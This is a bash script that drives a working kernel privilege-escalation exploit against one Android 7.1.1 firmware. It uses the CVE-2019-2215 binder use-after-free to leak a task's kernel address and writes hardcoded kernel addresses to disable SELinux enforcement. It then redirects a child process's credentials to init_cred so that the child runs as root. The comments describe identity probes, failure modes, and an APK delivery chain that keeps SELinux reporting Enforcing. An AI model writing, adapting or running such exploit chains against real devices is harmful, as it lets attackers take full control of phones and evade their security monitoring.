#!/usr/bin/env bash
# Root a process on official Android 7.1.1 (PD1610_D_7.12.15, 3.18.31-perf-g9dce1fbc9) and prove
# that a *fresh execve* carries uid 0.
#
# Why this exists instead of the 6.0.1 chain: the usermode helper *does* start here (dmesg shows
# { execute } { read open } { execute_no_trans } for our payload, permissive=1) but no ELF ever
# reaches userspace -- not ours, not even /system/bin/sh via binfmt_script -- so modprobe_path is
# dead on this firmware (ledger 483/484).  What works is pointing one task's two cred slots at
# init_cred (ledger 487):
#   * init_cred: absent from kallsyms (this ROM filters root-pivot names, ledger 479) but statically
#     initialised in .data, whose literals this Image stores as absolute values -> read out of the
#     file.  No kernel read needed;
#   * that task's VA: found in the CVE-2019-2215 leak window.
#
# How the needle avoids ledger 489/490's false hits -- it stops asking the window for a *shape* and
# asks it to agree about values we chose:
#   1. the witness child plants task_nice(current) into every binder_proc the kernel makes for it
#      (proc->default_priority, +0x1d0; pid@+0x30 and tsk@+0x48 all witnessed in binder_open), so a
#      candidate must carry the child's pid AND the child's planted nice;
#   2. several of the child's procs sit in the same kmalloc-512 queue as our freed thread slot, and
#      AGREEMENT is required: >=2 distinct objects naming the same ->tsk (accumulated across rounds);
#   3. before any cred is touched the candidate is *proven*: 4 bytes of foreign static_prio (+0x54)
#      go into it and the child reads its own nice back through getpriority(), then the value is
#      restored.  Only the right task answers, the write is reversible, and it grants nothing -- so a
#      wrong candidate costs one priority byte, never a rooted stranger or a corrupted cred slot;
#   4. NEGPID runs the identical scan against a pid nobody has; it must accept 0 candidates.
#
# Why the *child* is the patched task and not the leak machine: a task whose cred was redirected to
# init_cred dies at the first operation that copies a cred -- measured once inside fork() and once
# inside setresuid(), no oops in dmesg and no debuggerd report -- while it stays alive and keeps
# answering syscalls (step A of that run).  execve is the operation the delivery needs, so an
# unprivileged parent does all the forking, the driver patches that child, and the child only
# execve's.  That is also the shape the APK chain must take.
#
# Everything is memory state: adb reboot restores factory.  Offsets come from
# art/task_offsets-7.tsv (tools/task_offsets_7.py re-decodes every site and refuses to publish a
# stale row).  The witness is the patched process itself -- never the writer's byte count (478).
set -eu
set -o pipefail

ROOT=$(cd "$(dirname "$0")" && pwd)
SER=${SER:-$(adb devices | awk 'NR==2 && $2=="device"{print $1}')}
ADB="adb -s $SER"
DEV=/data/local/tmp
OUT=$DEV/cred.txt

KREL=$($ADB shell uname -r 2>/dev/null | tr -d '\r')
case "$KREL" in
  3.18.31-perf-g9dce1fbc9*)
    INIT_CRED=${INIT_CRED:-0xffffffc001a4ad08}
    SELINUX_ENFORCING=0xffffffc001d5dbe4	# run_temproot.sh's verified 7 profile
    OFF_TASK_CRED=0x4c0; OFF_TASK_REALCRED=0x658
    OFF_CRED_USAGE=0x0; OFF_TASK_PRIO=0x54 ;;
  *) printf 'ABORT: kernel %s has no verified profile -- init_cred must be derived from its own Image, not guessed\n' "$KREL" >&2; exit 1 ;;
esac

ROUNDS=${ROUNDS:-10}
HOLD=${HOLD:-300}
NICE=${NICE:-7}			# planted nice of the parent (the leak machine)
KIDNICE=$((NICE + 3))		# planted nice of the patched child -- the needle's target
BPFDS=${BPFDS:-8}
PRIO_PROBE=139			# static_prio written to prove identity (nice 19: legal, harmless)
NICE_PROBE=$((PRIO_PROBE - 120))
PRIO_HOME=$((120 + KIDNICE))	# static_prio the child reads back when not being probed

# zsh/bash arithmetic truncates 64-bit hex ("number truncated after 15 digits") and once sent two
# writes to a wrong address -- every address calculation here goes through python (ledger 487).
addr_add() { python3 -c "import sys; print(hex(int(sys.argv[1],16) + int(sys.argv[2],16)))" "$1" "$2"; }
le32_hex() { python3 -c "import sys; print(int(sys.argv[1],10).to_bytes(4,'little').hex())" "$1"; }
rev64_hex() { python3 -c "import sys; print(bytes.fromhex('%016x' % int(sys.argv[1],16))[::-1].hex())" "$1"; }

for f in broot clobber; do
	[ -x "$ROOT/$f" ] || { printf 'ABORT: build %s first (missing %s)\n' "$f" "$ROOT/$f" >&2; exit 1; }
done
# Push gate: a mistyped NDK path once made clang fail silently and I pushed the *old* binary, so a
# string only the current source contains must be in the file before it goes on-device (ledger 488).
grep -aq 'pre-execl' "$ROOT/broot" || { printf 'ABORT: %s/broot predates the WCHILD witness\n' "$ROOT" >&2; exit 1; }
for f in broot clobber; do
	$ADB push "$ROOT/$f" "$DEV/$f" >/dev/null 2>&1 || { printf 'ABORT: push %s\n' "$f" >&2; exit 1; }
	$ADB shell chmod 0755 "$DEV/$f" >/dev/null
done

fire() { # addr hexpayload -- three batches, the UAF write is a per-attempt lottery
	local i
	for i in 1 2 3; do
		if $ADB shell "$DEV/clobber 14 kern $1 hex:$2 4 0" 2>&1 | tr -d '\r' | grep -q 'CLOBBER OK'; then
			printf '  write %-22s <- %-16s : OK (try %d)\n' "$1" "$2" "$i"
			return 0
		fi
	done
	printf '  write %s <- %s : no hit in three batches\n' "$1" "$2" >&2
	return 1
}

# The child reports through its raw witness file, not stdout: the first rooted child vanished with
# exit status 0 and left no line in the parent's log, and stdio is exactly what cannot be trusted to
# survive a cred swap.  Each poll line carries uid and nice, so this file is both the identity
# channel (nice follows our write) and the exec witness (uid 0 plus the EXEC line).
WFILE=$DEV/wexec.txt
kid_nice_of() {
	$ADB shell "grep -E '^poll ' $WFILE 2>/dev/null | tail -n 1" | tr -d '\r' | sed 's/.*nice=//; s/ v=.*//'
}
kid_uid_of() {
	$ADB shell "grep -E '^poll ' $WFILE 2>/dev/null | tail -n 1" | tr -d '\r' | sed 's/.* uid=//; s/ euid=.*//'
}
wait_kid_nice() { # want timeout_seconds
	local got="" i=0
	while [ $i -lt "$2" ]; do
		got=$(kid_nice_of || true)
		[ "$got" = "$1" ] && { printf '  child reads back nice=%s\n' "$got"; return 0; }
		sleep 2; i=$((i + 2))
	done
	printf '  child reads nice=%s, wanted %s\n' "${got:-none}" "$1" >&2
	return 1
}

printf 'kernel %s -> init_cred=%s rounds=%s hold=%s parent nice=%s child nice=%s\n' \
	"$KREL" "$INIT_CRED" "$ROUNDS" "$HOLD" "$NICE" "$KIDNICE"

printf '\n=== 0. permissive, so the exec witness is not confounded by SELinux ===\n'
# The Enforcing delivery does not do this: it sets bits in policydb.permissive_map (the APK's libesc
# path) and leaves getenforce answering Enforcing.
if ! $ADB shell getenforce 2>/dev/null | tr -d '\r' | grep -q Permissive; then
	fire "$SELINUX_ENFORCING" 00000000 || exit 1
	printf '  getenforce now: %s\n' "$($ADB shell getenforce 2>/dev/null | tr -d '\r')"
else
	printf '  already %s\n' "$($ADB shell getenforce 2>/dev/null | tr -d '\r')"
fi

printf '\n=== 1. negative control: the same needle against a pid nobody has ===\n'
if [ "${SKIPNEG:-0}" = 1 ]; then
	printf '  SKIPPED by SKIPNEG=1 (run without it before trusting a new needle)\n'
else
	# `|| true` inside the assignment: broot exits non-zero when it refuses to run, and a failing
	# command substitution kills this script through `set -e` -- it did exactly that, silently, twice.
	NEG=$($ADB shell "cd $DEV; NEGPID=99991 SIG=1 NICE=$NICE WCHILD=$KIDNICE BPFDS=$BPFDS SPAN=0x400000 $DEV/broot ${NEGROUNDS:-3} 2>&1" | tr -d '\r' || true)
	printf '%s\n' "$NEG" | grep -E 'WCHILD|scan_sigs:|NEGCTRL' || true
	grep -q 'needle is sharp' <<<"$NEG" || printf '  ^^ a nonexistent pid still gets accepted -> the needle identifies nothing\n'
fi

printf '\n=== 2. leak window + needle (planted values, then agreement) ===\n'
# setsid + stdin from /dev/null: launched as a plain `adb shell "cmd &"` the holder was killed when
# that shell's session tore down (ledger 488).
$ADB shell "rm -f $OUT $WFILE; cd $DEV; SPAN=0x400000 SIG=1 NICE=$NICE WCHILD=$KIDNICE BPFDS=$BPFDS PERROUND=3 HOLD=$HOLD setsid nohup $DEV/broot $ROUNDS > $OUT 2>&1 < /dev/null &" >/dev/null 2>&1
TASK=""
for _ in $(seq 1 $((ROUNDS * 12))); do
	TASK=$($ADB shell "grep -m1 -oE 'TASKVA=0x[0-9a-f]+' $OUT 2>/dev/null" | tr -d '\r' | sed 's/.*=//') || true
	[ -n "$TASK" ] && break
	sleep 4
done
KID=$($ADB shell "grep -m1 -oE 'WCHILD: forked uid-2000 witness child pid=[0-9]+' $OUT 2>/dev/null" | tr -d '\r' | grep -oE '[0-9]+$') || true
LPID=$($ADB shell "grep -m1 -oE 'bpfds: [0-9]+ extra binder_proc\\(s\\) of pid [0-9]+' $OUT 2>/dev/null" | tr -d '\r' | grep -oE '[0-9]+$') || true
# The scan lines come out whether or not we got an address: aborting without them leaves no way to
# tell "raise the rounds" from "the needle is broken".
$ADB shell "grep -E 'WCHILD|PROC cand|tsk .*named by|TASKVA=|scan_sigs:' $OUT" 2>&1 | tr -d '\r' | tail -30 || true
[ -n "$TASK" ] || { printf 'ABORT: the needle never agreed on one tsk (raise ROUNDS/BPFDS/SPAN)\n' >&2; exit 1; }
[ -n "$KID" ] || { printf 'ABORT: no witness child pid in the log\n' >&2; exit 1; }
printf '  patched pid=%s (leak machine pid=%s)  agreed task=%s\n' "$KID" "${LPID:-?}" "$TASK"

printf '\n=== 3. identity probe: foreign static_prio in, the child reads its own nice back ===\n'
# getpriority() is computed by the kernel as current->static_prio - 120, so the child reading its own
# nice IS a read of the field we write.  Deliberately not /proc/<pid>/stat column numbers: this
# kernel's nice column is not the one the man page gives, and a parse off by one turns the witness
# into a blind ruler.  (/proc/<pid>/sched's `prio` is p->prio, recomputed only at enqueue -- that is
# not a face of the written field either.)
for _ in $(seq 1 90); do [ -n "$(kid_nice_of || true)" ] && break; sleep 2; done
printf '  baseline child uid=%s nice=%s (expect %s)\n' "$(kid_uid_of || true)" "$(kid_nice_of || true)" "$KIDNICE"
fire "$(addr_add "$TASK" $OFF_TASK_PRIO)" "$(le32_hex $PRIO_PROBE)" || exit 1
wait_kid_nice "$NICE_PROBE" 90 || {
	printf 'ABORT: the agreed task did not answer -> needle is not the child; NO CRED WAS TOUCHED\n' >&2
	$ADB shell "tail -n 8 $OUT" 2>&1 | tr -d '\r' || true
	fire "$(addr_add "$TASK" $OFF_TASK_PRIO)" "$(le32_hex $PRIO_HOME)" >/dev/null 2>&1 || true
	exit 1
}
fire "$(addr_add "$TASK" $OFF_TASK_PRIO)" "$(le32_hex $PRIO_HOME)" || exit 1
wait_kid_nice "$KIDNICE" 90 || { printf 'ABORT: probe value not restored\n' >&2; exit 1; }
printf '  IDENTITY CONFIRMED: %s is pid %s -- its own getpriority() went %s -> %s -> %s across our write and restore\n' \
	"$TASK" "$KID" "$KIDNICE" "$NICE_PROBE" "$KIDNICE"

printf '\n=== 4. raise init_cred->usage, then redirect both cred pointers ===\n'
REV=$(rev64_hex "$INIT_CRED")
# init_cred->usage must be *raised* (a rooted task put_cred()s it on exit without having taken a
# reference, and the stock value is 4) -- with a positive number, not 0xffffffff: that word reads as
# a signed -1 inside the cred paths.
fire "$(addr_add "$INIT_CRED" $OFF_CRED_USAGE)" "$(le32_hex ${CRED_USAGE:-4096})" || exit 1
fire "$(addr_add "$TASK" $OFF_TASK_CRED)" "$REV" || exit 1
fire "$(addr_add "$TASK" $OFF_TASK_REALCRED)" "$REV" || exit 1

printf '\n=== 5. witness: only the patched process may speak ===\n'
for _ in $(seq 1 $((HOLD / 4 + 20))); do
	$ADB shell "grep -qE 'EXEC uid=|execl-FAILED|broken' $WFILE" >/dev/null 2>&1 && break || true
	sleep 4
done
$ADB shell "grep -E 'WPROBE|WEXEC|SIGNAL|ROOTED|step [ABC]|SELFUID|pre :|post :' $OUT" 2>&1 | tr -d '\r' | tail -30 || true

printf '\n=== 6. witness file written by the patched child itself (no stdio involved) ===\n'
$ADB shell "grep -vE '^poll ' $WFILE 2>/dev/null | tail -n 12; echo; grep -cE '^poll ' $WFILE 2>/dev/null | sed 's/^/poll lines: /'" 2>&1 | tr -d '\r' || true
$ADB shell "grep -E '^poll ' $WFILE 2>/dev/null | tail -n 3" 2>&1 | tr -d '\r' || true

printf '\n=== 7. external witnesses ===\n'
$ADB shell "ls -ld /proc/$KID 2>&1" 2>&1 | tr -d '\r' || true
$ADB shell "ps -A -o USER,PID,NAME 2>/dev/null | grep -w $KID" 2>&1 | tr -d '\r' || true
printf '  leak machine (parent, deliberately NOT patched) must still be shell: '
$ADB shell "ps -A -o USER,PID,NAME 2>/dev/null | grep -w ${LPID:-1}" 2>&1 | tr -d '\r' || true
# 'bug' alone matches every debugfs avc line, which is how a fault counter once read 7 while nothing
# had faulted at all.
$ADB shell "dmesg | grep -cE 'Internal error|Oops|BUG:|kernel panic|Unable to handle|tainted'" 2>&1 | tr -d '\r' | sed 's/^/  kernel fault lines: /' || true
